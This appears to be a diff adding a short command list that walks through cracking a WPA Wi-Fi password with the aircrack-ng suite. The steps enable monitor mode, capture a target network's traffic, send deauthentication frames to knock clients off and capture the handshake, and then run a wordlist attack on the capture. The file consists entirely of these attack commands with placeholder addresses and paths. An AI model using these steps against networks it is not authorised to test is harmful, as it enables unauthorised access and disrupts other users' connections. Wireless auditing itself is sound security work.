@@ -1,0 +1,8 @@
+airmon-ng start wlan0
+airmon-ng stop wlan0
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng wlan0mon
+airodump-ng --bssid (mac address) -c(ch.11) --write (path)/root/Desktop/crack-wap wlan0mon (not close)
+aireplay-ng --deauth 10 -a (macadrress) wlan0mon
+aircrack-ng -w(wordlist) -b(mac address) (path crack-wap-01.cap)
